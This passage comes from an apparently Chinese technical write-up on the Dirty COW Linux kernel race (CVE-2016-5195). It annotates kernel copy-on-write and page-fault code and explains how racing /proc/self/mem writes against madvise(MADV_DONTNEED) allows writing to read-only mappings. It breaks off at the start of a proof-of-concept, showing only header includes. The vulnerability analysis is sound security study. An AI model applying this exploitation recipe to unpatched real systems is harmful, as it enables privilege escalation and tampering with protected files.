<a class="sourceLine" id="cb2-73" title="73">            flush_tlb_fix_spurious_fault(vma, address);</a>
<a class="sourceLine" id="cb2-74" title="74">    }</a>
<a class="sourceLine" id="cb2-75" title="75">unlock:</a>
<a class="sourceLine" id="cb2-76" title="76">    pte_unmap_unlock(pte, ptl);<span class="co">//解自旋锁</span></a>
<a class="sourceLine" id="cb2-77" title="77">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb2-78" title="78">}</a></code></pre></div>
<ul>
<li>或许页表项中内存页</li>
<li>该页不在主存中[1]
<ul>
<li>pte项为空，表示进程第一次访问该页，未与物理页建立映射关系
<ul>
<li>该页为匿名页，分配内容初始化为0的页框</li>
<li>该页不为匿名页，调用 <code>do_fault()</code> 进行进一步的分配操作</li>
</ul></li>
<li>pte项不为空，说明该页此前访问过，但是被换到交换空间（外存）里了（太久没用？），此时只需将该页交换回来即可</li>
</ul></li>
<li>该页在主存中[2]
<ul>
<li>缺页异常由【写】操作引起
<ul>
<li>对应页不可写，调用 <code>do_wp_page()</code> 进行写时复制</li>
<li>对应页可写，标脏</li>
</ul></li>
<li>将新内容写入pte页表项中</li>
</ul></li>
</ul>
<p>那么我们不难看出，当一个进程首次访问一个内存页时应当会触发两次缺页异常，第一次走[1]，第二次走[2]，后面再进行进一步的分析</p>
<h4 id="处理写时复制无内存页-do_cow_fault">3. 处理写时复制（无内存页）： do_cow_fault()</h4>
<p>本篇主要关注写时复制的过程；COW流程在第一次写时触发缺页异常最终便会进入到 <code>do_cow_fault()</code> 中处理，该函数同样位于 <code>mm/memory.c</code> 中</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb3-1" title="1"><span class="dt">static</span> <span class="dt">int</span> do_cow_fault(<span class="kw">struct</span> mm_struct *mm, <span class="kw">struct</span> vm_area_struct *vma,</a>
<a class="sourceLine" id="cb3-2" title="2">        <span class="dt">unsigned</span> <span class="dt">long</span> address, pmd_t *pmd,</a>
<a class="sourceLine" id="cb3-3" title="3">        pgoff_t pgoff, <span class="dt">unsigned</span> <span class="dt">int</span> flags, pte_t orig_pte)</a>
<a class="sourceLine" id="cb3-4" title="4">{</a>
<a class="sourceLine" id="cb3-5" title="5">    <span class="kw">struct</span> page *fault_page, *new_page;</a>
<a class="sourceLine" id="cb3-6" title="6">    <span class="kw">struct</span> mem_cgroup *memcg;</a>
<a class="sourceLine" id="cb3-7" title="7">    spinlock_t *ptl;</a>
<a class="sourceLine" id="cb3-8" title="8">    pte_t *pte;</a>
<a class="sourceLine" id="cb3-9" title="9">    <span class="dt">int</span> ret;</a>
<a class="sourceLine" id="cb3-10" title="10"></a>
<a class="sourceLine" id="cb3-11" title="11">    <span class="cf">if</span> (unlikely(anon_vma_prepare(vma)))</a>
<a class="sourceLine" id="cb3-12" title="12">        <span class="cf">return</span> VM_FAULT_OOM;</a>
<a class="sourceLine" id="cb3-13" title="13"></a>
<a class="sourceLine" id="cb3-14" title="14">    new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);<span class="co">//分配新物理页</span></a>
<a class="sourceLine" id="cb3-15" title="15">    <span class="cf">if</span> (!new_page)<span class="co">//失败了</span></a>
<a class="sourceLine" id="cb3-16" title="16">        <span class="cf">return</span> VM_FAULT_OOM;</a>
<a class="sourceLine" id="cb3-17" title="17"></a>
<a class="sourceLine" id="cb3-18" title="18">    <span class="cf">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) {</a>
<a class="sourceLine" id="cb3-19" title="19">        page_cache_release(new_page);</a>
<a class="sourceLine" id="cb3-20" title="20">        <span class="cf">return</span> VM_FAULT_OOM;</a>
<a class="sourceLine" id="cb3-21" title="21">    }</a>
<a class="sourceLine" id="cb3-22" title="22"></a>
<a class="sourceLine" id="cb3-23" title="23">    ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);<span class="co">//读取文件内容到fault_page</span></a>
<a class="sourceLine" id="cb3-24" title="24">    <span class="cf">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</a>
<a class="sourceLine" id="cb3-25" title="25">        <span class="cf">goto</span> uncharge_out;</a>
<a class="sourceLine" id="cb3-26" title="26"></a>
<a class="sourceLine" id="cb3-27" title="27">    <span class="cf">if</span> (fault_page)</a>
<a class="sourceLine" id="cb3-28" title="28">        copy_user_highpage(new_page, fault_page, address, vma);<span class="co">//拷贝fault_page内容到new_page</span></a>
<a class="sourceLine" id="cb3-29" title="29">    __SetPageUptodate(new_page);</a>
<a class="sourceLine" id="cb3-30" title="30"></a>
<a class="sourceLine" id="cb3-31" title="31">    pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<span class="co">//多线程操作，上锁？</span></a>
<a class="sourceLine" id="cb3-32" title="32">    <span class="cf">if</span> (unlikely(!pte_same(*pte, orig_pte))) {<span class="co">//pte和orig_pte不一致，说明中间有人修改了pte，那么释放fault_page和new_page页面并退出</span></a>
<a class="sourceLine" id="cb3-33" title="33">        pte_unmap_unlock(pte, ptl);</a>
<a class="sourceLine" id="cb3-34" title="34">        <span class="cf">if</span> (fault_page) {</a>
<a class="sourceLine" id="cb3-35" title="35">            unlock_page(fault_page);</a>
<a class="sourceLine" id="cb3-36" title="36">            page_cache_release(fault_page);</a>
<a class="sourceLine" id="cb3-37" title="37">        } <span class="cf">else</span> {</a>
<a class="sourceLine" id="cb3-38" title="38">            <span class="co">/*</span></a>
<a class="sourceLine" id="cb3-39" title="39"><span class="co">             * The fault handler has no page to lock, so it holds</span></a>
<a class="sourceLine" id="cb3-40" title="40"><span class="co">             * i_mmap_lock for read to protect against truncate.</span></a>
<a class="sourceLine" id="cb3-41" title="41"><span class="co">             */</span></a>
<a class="sourceLine" id="cb3-42" title="42">            i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</a>
<a class="sourceLine" id="cb3-43" title="43">        }</a>
<a class="sourceLine" id="cb3-44" title="44">        <span class="cf">goto</span> uncharge_out;</a>
<a class="sourceLine" id="cb3-45" title="45">    }</a>
<a class="sourceLine" id="cb3-46" title="46">    do_set_pte(vma, address, new_page, pte, true, true);<span class="co">//设置pte，置换该进程中的pte表项，对于写操作会将该页标脏（该函数会调用maybe_mkwrite()函数，其会调用pte_mkdirty()函数标脏该页）</span></a>
<a class="sourceLine" id="cb3-47" title="47">    mem_cgroup_commit_charge(new_page, memcg, false);</a>
<a class="sourceLine" id="cb3-48" title="48">    lru_cache_add_active_or_unevictable(new_page, vma);</a>
<a class="sourceLine" id="cb3-49" title="49">    pte_unmap_unlock(pte, ptl);</a>
<a class="sourceLine" id="cb3-50" title="50">    <span class="cf">if</span> (fault_page) {</a>
<a class="sourceLine" id="cb3-51" title="51">        unlock_page(fault_page);<span class="co">//释放fault_page</span></a>
<a class="sourceLine" id="cb3-52" title="52">        page_cache_release(fault_page);</a>
<a class="sourceLine" id="cb3-53" title="53">    } <span class="cf">else</span> {</a>
<a class="sourceLine" id="cb3-54" title="54">        <span class="co">/*</span></a>
<a class="sourceLine" id="cb3-55" title="55"><span class="co">         * The fault handler has no page to lock, so it holds</span></a>
<a class="sourceLine" id="cb3-56" title="56"><span class="co">         * i_mmap_lock for read to protect against truncate.</span></a>
<a class="sourceLine" id="cb3-57" title="57"><span class="co">         */</span></a>
<a class="sourceLine" id="cb3-58" title="58">        i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</a>
<a class="sourceLine" id="cb3-59" title="59">    }</a>
<a class="sourceLine" id="cb3-60" title="60">    <span class="cf">return</span> ret;</a>
<a class="sourceLine" id="cb3-61" title="61">uncharge_out:</a>
<a class="sourceLine" id="cb3-62" title="62">    mem_cgroup_cancel_charge(new_page, memcg);</a>
<a class="sourceLine" id="cb3-63" title="63">    page_cache_release(new_page);</a>
<a class="sourceLine" id="cb3-64" title="64">    <span class="cf">return</span> ret;</a>
<a class="sourceLine" id="cb3-65" title="65">}</a></code></pre></div>
<h4 id="处理写时复制有内存页do_wp_page">4. 处理写时复制（有内存页）：do_wp_page()</h4>
<p>当通过 <code>do_fault()</code> 获取内存页之后，第二次触发缺页异常时便会最终交由 <code>do_wp_page()</code> 函数处理，该函数同样位于 <code>mm/memory.c</code> 中</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb4-1" title="1"><span class="co">/*</span></a>
<a class="sourceLine" id="cb4-2" title="2"><span class="co"> * This routine handles present pages, when users try to write</span></a>
<a class="sourceLine" id="cb4-3" title="3"><span class="co"> * to a shared page. It is done by copying the page to a new address</span></a>
<a class="sourceLine" id="cb4-4" title="4"><span class="co"> * and decrementing the shared-page counter for the old page.</span></a>
<a class="sourceLine" id="cb4-5" title="5"><span class="co"> *</span></a>
<a class="sourceLine" id="cb4-6" title="6"><span class="co"> * Note that this routine assumes that the protection checks have been</span></a>
<a class="sourceLine" id="cb4-7" title="7"><span class="co"> * done by the caller (the low-level page fault routine in most cases).</span></a>
<a class="sourceLine" id="cb4-8" title="8"><span class="co"> * Thus we can safely just mark it writable once we&#39;ve done any necessary</span></a>
<a class="sourceLine" id="cb4-9" title="9"><span class="co"> * COW.</span></a>
<a class="sourceLine" id="cb4-10" title="10"><span class="co"> *</span></a>
<a class="sourceLine" id="cb4-11" title="11"><span class="co"> * We also mark the page dirty at this point even though the page will</span></a>
<a class="sourceLine" id="cb4-12" title="12"><span class="co"> * change only once the write actually happens. This avoids a few races,</span></a>
<a class="sourceLine" id="cb4-13" title="13"><span class="co"> * and potentially makes it more efficient.</span></a>
<a class="sourceLine" id="cb4-14" title="14"><span class="co"> *</span></a>
<a class="sourceLine" id="cb4-15" title="15"><span class="co"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span></a>
<a class="sourceLine" id="cb4-16" title="16"><span class="co"> * but allow concurrent faults), with pte both mapped and locked.</span></a>
<a class="sourceLine" id="cb4-17" title="17"><span class="co"> * We return with mmap_sem still held, but pte unmapped and unlocked.</span></a>
<a class="sourceLine" id="cb4-18" title="18"><span class="co"> */</span></a>
<a class="sourceLine" id="cb4-19" title="19"><span class="dt">static</span> <span class="dt">int</span> do_wp_page(<span class="kw">struct</span> mm_struct *mm, <span class="kw">struct</span> vm_area_struct *vma,</a>
<a class="sourceLine" id="cb4-20" title="20">        <span class="dt">unsigned</span> <span class="dt">long</span> address, pte_t *page_table, pmd_t *pmd,</a>
<a class="sourceLine" id="cb4-21" title="21">        spinlock_t *ptl, pte_t orig_pte)</a>
<a class="sourceLine" id="cb4-22" title="22">    __releases(ptl)</a>
<a class="sourceLine" id="cb4-23" title="23">{</a>
<a class="sourceLine" id="cb4-24" title="24">    <span class="kw">struct</span> page *old_page;<span class="co">//原有的页</span></a>
<a class="sourceLine" id="cb4-25" title="25"></a>
<a class="sourceLine" id="cb4-26" title="26">    old_page = vm_normal_page(vma, address, orig_pte);<span class="co">//获取缺页的线性地址对应的struct page结构，对于一些特殊映射的页面（如页面回收、页迁移和KSM等），内核并不希望这些页参与到内存管理的一些流程当中，称之为 special mapping，并无对应的struct page结构体</span></a>
<a class="sourceLine" id="cb4-27" title="27">    <span class="cf">if</span> (!old_page) {<span class="co">//NULL，说明是一个 special mapping 页面；否则说明是normal mapping页面</span></a>
<a class="sourceLine" id="cb4-28" title="28">        <span class="co">/*</span></a>
<a class="sourceLine" id="cb4-29" title="29"><span class="co">         * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span></a>
<a class="sourceLine" id="cb4-30" title="30"><span class="co">         * VM_PFNMAP VMA.</span></a>
<a class="sourceLine" id="cb4-31" title="31"><span class="co">         *</span></a>
<a class="sourceLine" id="cb4-32" title="32"><span class="co">         * We should not cow pages in a shared writeable mapping.</span></a>
<a class="sourceLine" id="cb4-33" title="33"><span class="co">         * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span></a>
<a class="sourceLine" id="cb4-34" title="34"><span class="co">         */</span></a>
<a class="sourceLine" id="cb4-35" title="35">        <span class="cf">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</a>
<a class="sourceLine" id="cb4-36" title="36">                     (VM_WRITE|VM_SHARED))</a>
<a class="sourceLine" id="cb4-37" title="37">            <span class="cf">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</a>
<a class="sourceLine" id="cb4-38" title="38">                         orig_pte, pmd);</a>
<a class="sourceLine" id="cb4-39" title="39"></a>
<a class="sourceLine" id="cb4-40" title="40">        pte_unmap_unlock(page_table, ptl);</a>
<a class="sourceLine" id="cb4-41" title="41">        <span class="cf">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</a>
<a class="sourceLine" id="cb4-42" title="42">                    orig_pte, old_page);</a>
<a class="sourceLine" id="cb4-43" title="43">    }</a>
<a class="sourceLine" id="cb4-44" title="44"></a>
<a class="sourceLine" id="cb4-45" title="45">    <span class="co">/*</span></a>
<a class="sourceLine" id="cb4-46" title="46"><span class="co">     * Take out anonymous pages first, anonymous shared vmas are</span></a>
<a class="sourceLine" id="cb4-47" title="47"><span class="co">     * not dirty accountable.</span></a>
<a class="sourceLine" id="cb4-48" title="48"><span class="co">     */</span></a>
<a class="sourceLine" id="cb4-49" title="49">    <span class="co">//先处理匿名页面</span></a>
<a class="sourceLine" id="cb4-50" title="50">    <span class="cf">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) {<span class="co">//原页面为匿名页面 &amp;&amp; 不是ksm页面</span></a>
<a class="sourceLine" id="cb4-51" title="51">        <span class="cf">if</span> (!trylock_page(old_page)) {<span class="co">//多线程相关操作，判断是否有其他线程的竞争</span></a>
<a class="sourceLine" id="cb4-52" title="52">            page_cache_get(old_page);</a>
<a class="sourceLine" id="cb4-53" title="53">            pte_unmap_unlock(page_table, ptl);</a>
<a class="sourceLine" id="cb4-54" title="54">            lock_page(old_page);</a>
<a class="sourceLine" id="cb4-55" title="55">            page_table = pte_offset_map_lock(mm, pmd, address,</a>
<a class="sourceLine" id="cb4-56" title="56">                             &amp;ptl);</a>
<a class="sourceLine" id="cb4-57" title="57">            <span class="cf">if</span> (!pte_same(*page_table, orig_pte)) {</a>
<a class="sourceLine" id="cb4-58" title="58">                unlock_page(old_page);</a>
<a class="sourceLine" id="cb4-59" title="59">                pte_unmap_unlock(page_table, ptl);</a>
<a class="sourceLine" id="cb4-60" title="60">                page_cache_release(old_page);</a>
<a class="sourceLine" id="cb4-61" title="61">                <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb4-62" title="62">            }</a>
<a class="sourceLine" id="cb4-63" title="63">            page_cache_release(old_page);</a>
<a class="sourceLine" id="cb4-64" title="64">        }</a>
<a class="sourceLine" id="cb4-65" title="65">        <span class="co">//此时没有其他线程与本线程竞争了，调用 reuse_swap_page() 判断使用该页的是否只有一个进程，若是的话就直接重用该页</span></a>
<a class="sourceLine" id="cb4-66" title="66">        <span class="cf">if</span> (reuse_swap_page(old_page)) {</a>
<a class="sourceLine" id="cb4-67" title="67">            <span class="co">/*</span></a>
<a class="sourceLine" id="cb4-68" title="68"><span class="co">             * The page is all ours.  Move it to our anon_vma so</span></a>
<a class="sourceLine" id="cb4-69" title="69"><span class="co">             * the rmap code will not search our parent or siblings.</span></a>
<a class="sourceLine" id="cb4-70" title="70"><span class="co">             * Protected against the rmap code by the page lock.</span></a>
<a class="sourceLine" id="cb4-71" title="71"><span class="co">             */</span></a>
<a class="sourceLine" id="cb4-72" title="72">            page_move_anon_rmap(old_page, vma, address);</a>
<a class="sourceLine" id="cb4-73" title="73">            unlock_page(old_page);</a>
<a class="sourceLine" id="cb4-74" title="74">            <span class="cf">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</a>
<a class="sourceLine" id="cb4-75" title="75">                         orig_pte, old_page, <span class="dv">0</span>, <span class="dv">0</span>);<span class="co">//一般的cow流程会走到这里，重用由do_cow_fault()分配好的内存页，不会再开辟新页</span></a>
<a class="sourceLine" id="cb4-76" title="76">        }</a>
<a class="sourceLine" id="cb4-77" title="77">        unlock_page(old_page);</a>
<a class="sourceLine" id="cb4-78" title="78">    } <span class="cf">else</span> <span class="cf">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</a>
<a class="sourceLine" id="cb4-79" title="79">                    (VM_WRITE|VM_SHARED))) {</a>
<a class="sourceLine" id="cb4-80" title="80">        <span class="cf">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</a>
<a class="sourceLine" id="cb4-81" title="81">                      ptl, orig_pte, old_page);</a>
<a class="sourceLine" id="cb4-82" title="82">    }</a>
<a class="sourceLine" id="cb4-83" title="83"></a>
<a class="sourceLine" id="cb4-84" title="84">    <span class="co">/*</span></a>
<a class="sourceLine" id="cb4-85" title="85"><span class="co">     * Ok, we need to copy. Oh, well..</span></a>
<a class="sourceLine" id="cb4-86" title="86"><span class="co">     */</span></a>
<a class="sourceLine" id="cb4-87" title="87">    <span class="co">//实在没法重用了，进行写时复制</span></a>
<a class="sourceLine" id="cb4-88" title="88">    page_cache_get(old_page);</a>
<a class="sourceLine" id="cb4-89" title="89"></a>
<a class="sourceLine" id="cb4-90" title="90">    pte_unmap_unlock(page_table, ptl);</a>
<a class="sourceLine" id="cb4-91" title="91">    <span class="cf">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</a>
<a class="sourceLine" id="cb4-92" title="92">                orig_pte, old_page);</a>
<a class="sourceLine" id="cb4-93" title="93">}</a></code></pre></div>
<p>我们不难看出其核心思想是尝试重用内存页，实在没法重用时才会进行写时复制</p>
<h3 id="cow-与-缺页异常相关流程">[3] COW 与 缺页异常相关流程</h3>
<p>当我们使用mmap映射一个只读文件，随后开辟一个新进程，尝试通过 <code>/proc/self/mem</code> 文件直接往一个原有的共享页面写入内容时，其流程应当如下：</p>
<h4 id="sys_write">1. sys_write</h4>
<p>用户态的 <code>write</code> 系统调用最终对应的是内核中的 <code>sys_write()</code></p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb5-1" title="1">entry_SYSCALL_64()</a>
<a class="sourceLine" id="cb5-2" title="2">    sys_write()</a>
<a class="sourceLine" id="cb5-3" title="3">        vfs_write()</a>
<a class="sourceLine" id="cb5-4" title="4">            __vfs_write()</a>
<a class="sourceLine" id="cb5-5" title="5">                file-&gt;f_op-&gt;write()<span class="co">//该文件于内核中的文件描述符的file_operations结构体，类似于一张函数表，储存了默认的对于一些系统调用的处理函数指针</span></a></code></pre></div>
<h4 id="procselfmem绕过页表项权限">2. /proc/self/mem：绕过页表项权限</h4>
<p>“脏牛”通常利用的是 <code>/proc/self/mem</code> 进行越权写入，这也是整个“脏牛”利用中较为核心的流程</p>
<p>对于该文件的写入，通常的调用链是：</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb6-1" title="1">mem_write()<span class="co">//套娃，调用下一层的mem_rw()</span></a>
<a class="sourceLine" id="cb6-2" title="2">    mem_rw()<span class="co">//核心函数，分配页 + 拷贝数据（copy_from_user()）</span></a></code></pre></div>
<p>对于mem_rw(),调用流程如下：</p>
<ul>
<li>判断该文件对应的内存描述符是否为空，第一次进入时为空，返回上层，分配一个对应的 <code>mm_struct</code> 后会重新进入该函数</li>
<li>调用 <code>__get_free_page()</code> 函数分配一个空闲的内存页作为临时储存用户数据的空间</li>
<li><p>调用 <code>access_remote_vm()</code> 函数进行内存访问操作，根据传入的 <code>write</code> 参数进行读/写内存页面操作</p></li>
<li>通过 <code>get_user_pages()</code> 获取到对应的内存页（注意这里获取的是 <code>page</code> 结构体，因为该物理页不一定有映射）</li>
<li>通过 <code>kmap()</code> 或许到该内存页映射到的虚拟地址（若无则会建立新的临时映射）</li>
<li><p>通过 <code>copy_from_user_page()/copy_to_user_page()</code> 读/写对应的内存页</p></li>
</ul>
<p>COW的两个要点：</p>
<ul>
<li>在我们第一次尝试访问某个内存页时，由于延迟绑定机制，Linux尚未建立起该页与对应物理页间的映射，此时 <code>follow_page_mask()</code> 返回 NULL；由于没获取到对应内存页，接下来调用 <code>faultin_page()</code> 函数解决缺页异常，分配物理页</li>
<li>调用 <code>faultin_page()</code> 函数成功解决缺页异常之后会回到 <code>retry</code> 标签，接下来会重新调用 <code>follow_page_mask()</code> ，而若是当前进程对于该页没有写权限（二级页表标记为不可写），则还是会返回NULL；由于没获取到对应内存页，接下来调用 <code>faultin_page()</code> 函数解决缺页异常，进行写时复制</li>
</ul>
<p>所以<code>mem_rw()</code>的流程如下：</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb7-1" title="1">mem_rw()</a>
<a class="sourceLine" id="cb7-2" title="2">    __get_free_page()<span class="co">//获取空闲页，将要写入的数据进行拷贝</span></a>
<a class="sourceLine" id="cb7-3" title="3">    access_remote_vm()</a>
<a class="sourceLine" id="cb7-4" title="4">        __access_remote_vm()<span class="co">// 写入数据，执行 write 这一系统调用的核心功能</span></a>
<a class="sourceLine" id="cb7-5" title="5">            get_user_pages()</a>
<a class="sourceLine" id="cb7-6" title="6">                __get_user_pages_locked()</a>
<a class="sourceLine" id="cb7-7" title="7">                    __get_user_pages()<span class="co">//获取对应的用户进程的内存页</span></a>
<a class="sourceLine" id="cb7-8" title="8">                        follow_page_mask()<span class="co">//调内存页的核心函数</span></a>
<a class="sourceLine" id="cb7-9" title="9">                        faultin_page()<span class="co">//解决缺页异常</span></a></code></pre></div>
<h4 id="第一次缺页异常">3. 第一次缺页异常</h4>
<p>由于 Linux 的延迟绑定机制，在第一次访问某个内存页之前 Linux kernel 并不会为其分配物理页，于是我们没法获取到对应的页表项， <code>follow_page_mask()</code> 返回 NULL，此时便会进入 <code>faultin_page()</code> 函数处理缺页异常.</p>
<p>大致流程如下：</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb8-1" title="1">faultin_page()</a>
<a class="sourceLine" id="cb8-2" title="2">    handle_mm_fault()</a>
<a class="sourceLine" id="cb8-3" title="3">        __handle_mm_fault()</a>
<a class="sourceLine" id="cb8-4" title="4">            handle_pte_fault()<span class="co">//发现pte为空，第一次访问该页</span></a>
<a class="sourceLine" id="cb8-5" title="5">                do_fault()<span class="co">//非匿名页，直接调入</span></a>
<a class="sourceLine" id="cb8-6" title="6">                    do_cow_fault()<span class="co">//我们要写入该页，所以走到了这里</span></a>
<a class="sourceLine" id="cb8-7" title="7">                        do_set_pte()</a>
<a class="sourceLine" id="cb8-8" title="8">                            maybe_mkwrite()</a>
<a class="sourceLine" id="cb8-9" title="9">                                pte_mkdirty()<span class="co">//将该页标脏</span></a></code></pre></div>
<p>之后该页被调入主存中，但是此时我们并无对该页的写权限</p>
<h4 id="第二次缺页异常">4. 第二次缺页异常</h4>
<p>虽然我们成功调入了内存页，但是由于我们对该页并无写权限， <code>follow_page_mask()</code> 依旧会返回 NULL ，再次触发缺页异常，于是我们再次进入 <code>faultin_page()</code> 函数，来到了<strong>「写时复制」</strong>的流程，细节在前面已经分析过了，这里便不再赘叙</p>
<p>由于这一次成功获取到了一个可写的内存页，此时 <code>faultin_page()</code> 函数会清除 <code>foll_flags</code> 的 <code>FOLL_WRITE</code> 标志位</p>
<p>大致流程如下：</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb9-1" title="1">faultin_page()</a>
<a class="sourceLine" id="cb9-2" title="2">    handle_mm_fault()</a>
<a class="sourceLine" id="cb9-3" title="3">        __handle_mm_fault()</a>
<a class="sourceLine" id="cb9-4" title="4">            handle_pte_fault()</a>
<a class="sourceLine" id="cb9-5" title="5">                do_wp_page()</a>
<a class="sourceLine" id="cb9-6" title="6">                    reuse_swap_page(old_page)</a>
<a class="sourceLine" id="cb9-7" title="7">                        wp_page_reuse()</a></code></pre></div>
<p>接下来的流程最终回到 <code>__get_user_pages()</code> 的 retry 标签，<strong>第三次</strong>尝试获取内存页，此时 <code>foll_flags</code> 的 <code>FOLL_WRITE</code> 标志位已经被清除，<strong>内核认为该页可写</strong>，于是 <code>follow_page_mask()</code> 函数成功获取到该内存页，接下来便是常规的写入流程， COW 结束</p>
<h2 id="x01-漏洞分析">0x01 漏洞分析</h2>
<p>既然CVE-2016-5195俗称<strong>「dirtyCOW」</strong>，毫无疑问漏洞出现在 COW 的过程当中</p>
<h3 id="多线程竞争">[1] 多线程竞争</h3>
<p>我们在通过 <code>follow_page_mask()</code> 函数获取对应的内存页之前，用以判断该内存页是否可写的逻辑是根据 <code>foll_flags</code> 的 <code>FOLL_WRITE</code> 标志位进行判断的，但是决定 从该内存页读出数据/向该内存页写入数据 则是由传入给 <code>mem_rw()</code> 函数的参数 <code>write</code> 决定的</p>
<p>我们来思考如下竞争过程，假如我们启动了两个线程：</p>
<ul>
<li>[1] 第一个线程尝试向<strong>「仅具有读权限的mmap映射区域写入内容」</strong>，此时便会触发缺页异常，进入到写时复制（COW）的流程当中</li>
<li>[2] 第二个线程使用 <code>madvise()</code> 函数通知内核<strong>「第一个线程要写入的那块区域标为未使用」</strong>，此时由 COW 分配得到的新内存页将会被再次调出</li>
</ul>
<h3 id="四次获取内存页-三次缺页异常">[2] 四次获取内存页 &amp; 三次缺页异常</h3>
<p>既然这两个线程跑在竞争态，在第一个线程走完两次缺页异常的流程之后，若是第二个线程调用 madvise() 将页表项中的该页再次调出，<strong>第一个线程在第三次尝试获取内存页时便无法获取到内存页，便会再次触发缺页异常</strong>，接下来进入到 <code>faultin_page()</code> 的流程获取原内存页</p>
<p>而 <code>__get_user_pages()</code> 函数中 <code>foll_flags</code> 的 <code>FOLL_WRITE</code> 标志位已经<strong>在第二次尝试获取内存页、第二次触发缺页异常</strong>被清除， 此时该函数 <strong>第四次尝试获取内存页</strong>，由于不存在标志位的冲突，<strong>便可以 “正常” 获取到内存页</strong></p>
<p>接下来便回到了 <code>mem_rw()</code>的写流程，此时我们便成功绕过了 <code>foll_flags</code>对于读写的检测，成功获取到只有读权限的内存页，<strong>完成越权写</strong></p>
<h2 id="x02-漏洞总结">0x02 漏洞总结</h2>
<p>当我们用mmap去映射文件到内存区域时使用了MAP_PRIVATE标记，我们写文件时会写到COW机制产生的内存区域中，原文件不受影响。其中获取用户进程内存页的过程如下：</p>
<p>第一次调用follow_page_mask查找虚拟地址对应的page，因为我们要求页表项要具有写权限，所以FOLL_WRITE为1。因为所在page不在内存中，follow_page_mask返回NULL，第一次失败，进入faultin_page，最终进入do_cow_fault分配不带_PAGE_RW标记的匿名内存页，返回值为0。</p>
<p>重新开始循环，第二次调用follow_page_mask，同样带有FOLL_WRITE标记。由于不满足((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte))条件，follow_page_mask返回NULL，第二次失败，进入faultin_page，最终进入do_wp_page函数分配COW页。并在上级函数faultin_page中去掉FOLL_WRITE标记,返回0。</p>
<p>重新开始循环，第三次调用follow_page_mask，不带FOLL_WRITE标记。成功得到page。但是由于进行了COW，所以写操作并不会涉及到原始内存。</p>
<p>上述即为正常情况下的COW过程。但是在这个过程中存在隐患，首先在__get_user_pages函数中每次查找page前会先调用cond_resched()线程调度一下，这样就引入了条件竞争的可能性。同时在第二次查找页结束时，FOLL_WRITE就已经被去掉了。如果此时我们取消内存的映射关系，第三次执行就又会像第一次执行时一样，执行do_fault函数进行页面映射。但是区别于第一次执行，这一次执行时FOLL_WRITE已被去掉，导致FAULT_FLAG_WRITE置0，所以直接执行do_read_fault。而do_read_fault函数调用了__do_fault，由于标志位的改变，所以不会通过COW进行映射，而是直接映射，得到的page带有__PAGE_DIRTY标志，产生了条件竞争。</p>
<p>综合上述的漏洞原理分析，我们在进行漏洞利用的时候，主要需要实现的就是在进行完第二次页面查找后取消页面的映射关系。于是得到漏洞利用流程如下：</p>
<p>第一次follow_page_mask(FOLL_WRITE)，page不在内存中，进行pagefault处理；</p>
<p>第二次follow_page_mask(FOLL_WRITE)，page没有写权限，并去掉FOLL_WRITE；</p>
<p>另一个线程释放上一步分配的COW页；</p>
<p>第三次follow_page_mask(无FOLL_WRITE)，page不在内存中，进行pagefault处理；</p>
<p>第四次follow_page_mask(无FOLL_WRITE),成功返回page，但没有使用COW机制。</p>
<p>对于取消页面映射关系，我们可以通过执行madvise(MADV_DONTNEED)实现。madvise系统调用的作用是给系统对于内存使用的一些建议，MADV_DONTNEED参数告诉系统未来不访问该内存了，内核可以释放内存页了。内核函数madvise_dontneed中会移除指定范围内的用户空间page。</p>
<p>最后综合上述利用思路和方法，我们需要做的就是创建两个线程，一个通过write进行页面调度，另一个通过madvise进行取消页面映射。</p>
<h2 id="x03-漏洞利用">0x03 漏洞利用</h2>
<p>有了以上思路，我们的 POC 并不算特别难写，<strong>开两个线程来竞争</strong>即可</p>
<p>我们先通过 mmap 以只读权限映射一个文件，随后尝试通过 <code>/proc/self/mem</code> 文件直接向进程的对应内存区域写入，这样便可以无视 mmap 设定的权限进行写入，从而触发 COW</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb10-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb10-2" title="2"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
<a class="sourceLine" id="cb10-3" title="3"><span class="pp">#include </span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb10-4" title="4"><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></a>
